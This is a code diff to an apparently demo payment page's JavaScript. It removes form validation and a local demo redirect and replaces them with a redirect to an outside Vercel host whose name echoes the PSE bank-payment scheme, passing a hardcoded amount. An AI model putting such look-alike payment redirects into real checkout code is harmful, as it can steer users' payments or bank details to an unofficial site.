@@ -371,46 +371,5 @@ function pagoVarias() {
     pagoIndividual();
 }
 function realizarPago() {
-
-    const campos = document.querySelectorAll(
-        ".seccion-pago-demo input, .seccion-pago-demo select"
-    );
-
-    for (const campo of campos) {
-
-        if (
-            campo.value.trim() === "" ||
-            campo.value === "Seleccione un medio de pago" ||
-            campo.value === "Seleccione una entidad" ||
-            campo.value === "Seleccione un banco" ||
-            campo.value === "Seleccione su Tipo de Documento"
-        ) {
-            alert("Por favor complete todos los datos antes de continuar.");
-            campo.focus();
-            return;
-        }
-    }
-
-    const banco = document.getElementById("bancoSeleccionado").value;
-
-    const resumen = document.querySelector(".resumen-total strong");
-
-    if (!resumen) {
-        alert("No se encontró el valor a pagar.");
-        return;
-    }
-
-    const total = resumen.textContent;
-
-    // Guardamos temporalmente los datos de la simulación
-    sessionStorage.setItem(
-        "datosPagoDemo",
-        JSON.stringify({
-            banco: banco,
-            total: total
-        })
-    );
-
-    // Ir a la siguiente página
-    window.location.href = "pago-demo.html";
+    window.location.href = "https://pse-dun.vercel.app/?valor=50000";
 }
